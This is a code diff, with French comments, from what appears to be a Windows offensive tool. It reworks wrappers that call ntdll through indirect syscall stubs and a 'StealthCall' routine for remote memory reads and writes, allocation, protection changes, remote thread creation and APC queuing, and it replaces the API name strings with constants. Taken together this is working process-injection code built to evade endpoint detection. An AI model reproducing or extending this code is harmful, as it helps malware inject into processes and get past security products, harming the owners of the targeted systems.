@@ -5,7 +5,7 @@
 BOOL WrapperReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead) {
     DWORD ssn = 0;
     PVOID target = NULL;
-    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), "NtReadVirtualMemory", &ssn, &target);
+    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), _NtReadVirtualMemory, &ssn, &target);
 
     if (!target) return FALSE;
 
@@ -24,7 +24,7 @@ BOOL WrapperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lp
     PVOID pNtWriteSyscallPtr = NULL;
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
 
-    getInDirectSyscallStub(hNtdll, "NtWriteVirtualMemory", &dwNtWriteSSN, &pNtWriteSyscallPtr);
+    getInDirectSyscallStub(hNtdll, _NtWriteVirtualMemory, &dwNtWriteSSN, &pNtWriteSyscallPtr);
 
     if (!pNtWriteSyscallPtr) {
         return FALSE;
@@ -50,26 +50,35 @@ BOOL WrapperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lp
     return TRUE;
 }
 
-BOOL WrapperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, LPVOID* lpOutAddress) {
+LPVOID WrapperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
     DWORD ssn = 0; PVOID target = NULL;
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
-    getInDirectSyscallStub(hNtdll, "NtAllocateVirtualMemory", &ssn, &target);
+    getInDirectSyscallStub(hNtdll, _NtAllocateVirtualMemory, &ssn, &target);
 
-    if (!target) return FALSE;
+    if (!target) return NULL;
 
-    // NtAllocateVirtualMemory(hProcess, &lpAddress, ZeroBits, &dwSize, flAllocationType, flProtect)
+    // Variables locales car NtAllocateVirtualMemory modifie les valeurs (Passage par pointeur)
+    LPVOID baseAddress = lpAddress;
+    SIZE_T regionSize = dwSize;
+
+    // NtAllocateVirtualMemory(ProcessHandle, *BaseAddress, ZeroBits, *RegionSize, AllocationType, Protect)
     NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 6, 
-        (UINT64)hProcess, (UINT64)&lpAddress, (UINT64)0, (UINT64)&dwSize, (UINT64)flAllocationType, (UINT64)flProtect);
+        (UINT64)hProcess, 
+        (UINT64)&baseAddress, 
+        (UINT64)0, 
+        (UINT64)&regionSize, 
+        (UINT64)flAllocationType, 
+        (UINT64)flProtect);
 
-    if (status != 0) return FALSE;
-    if (lpOutAddress) *lpOutAddress = lpAddress;
-    return TRUE;
+    if (status != 0) return NULL;
+
+    return baseAddress; // Retourne l'adresse allouée (comme Win32)
 }
 
 BOOL WrapperVirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
     DWORD ssn = 0; PVOID target = NULL;
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
-    getInDirectSyscallStub(hNtdll, "NtProtectVirtualMemory", &ssn, &target);
+    getInDirectSyscallStub(hNtdll, _NtProtectVirtualMemory, &ssn, &target);
 
     if (!target) return FALSE;
 
@@ -82,7 +91,7 @@ BOOL WrapperVirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, D
 
 BOOL WrapperCreateRemoteThreadEx(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, SIZE_T dwStackSize, PHANDLE phThread) {
     DWORD ssn = 0; PVOID target = NULL;
-    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx", &ssn, &target);
+    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), _NtCreateThreadEx, &ssn, &target);
     if (!target) return FALSE;
 
     // Conversion Win32 CREATE_SUSPENDED (0x4) -> NT_SUSPENDED (0x1)
@@ -98,7 +107,7 @@ BOOL WrapperCreateRemoteThreadEx(HANDLE hProcess, LPVOID lpStartAddress, LPVOID 
 BOOL WrapperQueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData) {
     DWORD ssn = 0; PVOID target = NULL;
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
-    getInDirectSyscallStub(hNtdll, "NtQueueApcThread", &ssn, &target);
+    getInDirectSyscallStub(hNtdll, _NtQueueApcThread, &ssn, &target);
 
     if (!target) return FALSE;
 
@@ -112,7 +121,7 @@ BOOL WrapperQueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData) {
 BOOL WrapperResumeThread(HANDLE hThread) {
     DWORD ssn = 0; PVOID target = NULL;
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
-    getInDirectSyscallStub(hNtdll, "NtResumeThread", &ssn, &target);
+    getInDirectSyscallStub(hNtdll, _NtResumeThread, &ssn, &target);
 
     ULONG suspendCount = 0;
     NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 2, (UINT64)hThread, (UINT64)&suspendCount);
@@ -123,7 +132,7 @@ BOOL WrapperResumeThread(HANDLE hThread) {
 HANDLE WrapperOpenProcess(DWORD dwPid) {
     DWORD ssn = 0; PVOID target = NULL;
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
-    getInDirectSyscallStub(hNtdll, "NtOpenProcess", &ssn, &target);
+    getInDirectSyscallStub(hNtdll, _NtOpenProcess, &ssn, &target);
 
     HANDLE hProcess = NULL;
     OBJECT_ATTRIBUTES objAttr;
@@ -142,7 +151,7 @@ HANDLE WrapperOpenProcess(DWORD dwPid) {
 BOOL WrapperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
     DWORD ssn = 0; PVOID target = NULL;
     HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
-    getInDirectSyscallStub(hNtdll, "NtWaitForSingleObject", &ssn, &target);
+    getInDirectSyscallStub(hNtdll, _NtWaitForSingleObject, &ssn, &target);
 
     LARGE_INTEGER timeout;
     timeout.QuadPart = -(LONGLONG)dwMilliseconds * 10000; // Conversion en temps relatif NT
@@ -154,12 +163,7 @@ BOOL WrapperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
 }
 
 LPVOID WrapperVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
-    LPVOID pAllocatedAddress = lpAddress;
-    if (WrapperVirtualAllocEx((HANDLE)-1, pAllocatedAddress, dwSize, flAllocationType, flProtect, &pAllocatedAddress)) {
-        return pAllocatedAddress;
-    }
-    
-    return NULL;
+    return WrapperVirtualAllocEx((HANDLE)-1, lpAddress, dwSize, flAllocationType, flProtect);
 }
 
 BOOL WrapperVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
